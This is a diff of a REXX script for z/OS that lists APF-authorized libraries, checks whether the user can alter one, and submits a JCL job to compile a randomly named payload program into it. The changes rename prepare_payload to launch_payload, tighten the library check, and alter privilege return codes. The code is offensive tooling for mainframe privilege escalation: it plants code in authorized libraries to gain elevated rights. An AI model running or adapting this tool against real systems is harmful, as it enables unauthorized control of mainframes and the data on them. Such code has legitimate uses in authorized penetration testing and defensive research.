@@ -30,15 +30,16 @@ if translate(dsn_input) =="LIST" then do
     list_apf()
 end
 else do    
+    call listdsi "'"dsn_input"'"
     
-    if sysdsn("'"dsn_input"'") <>'OK' then do
-        say "Cannot find APF Library '"dsn_input"'"
+    if sysdsorg <> "PO" then do
+        say "Cannot find APF Library '"dsn_input"', or not PDS"
         exit(-1)
-    end
+    end    
     
     priv  =  check_priv(dsn_input)
     
-    if (priv == "NOACCESS") then do
+    if (priv == "NONE") then do
         say "Not enough privileges to alter APF library "dsn_input
         exit(-1)
     end
@@ -51,16 +52,16 @@ else do
         say "Warning: No RACF profile defined for "dsn_input", might not be uptable"
     end
     
-    prepare_payload(dsn_input)
+    launch_payload(dsn_input)
     
 end
 
 
-prepare_payload:
+launch_payload:
     APF_DSN = arg(1)   
     PROG = rand_char(6)    
     say "Compiling " PROG "in" dsn_input
-    QUEUE "//ASMCMP1  JOB (JOBNAME),'XSS',CLASS=A"
+    QUEUE "//ASMCMP1  JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
     QUEUE "//*"
     QUEUE "//BUILD   EXEC ASMACL"
     QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
@@ -181,7 +182,7 @@ X = OUTTRAP('OUT.')
 ADDRESS TSO "LD DA('"DSN"')"
 Y = OUTTRAP('OFF')
 IF OUT.0 == 1 & INDEX(OUT.1,NOT_AUTH)>0 THEN DO
-   return "NOACCESS"
+   return "NONE"
 END
 IF OUT.0 == 1 & INDEX(OUT.1,NO_PROFILE)>0 THEN DO
    return "NO RACF PROFILE"
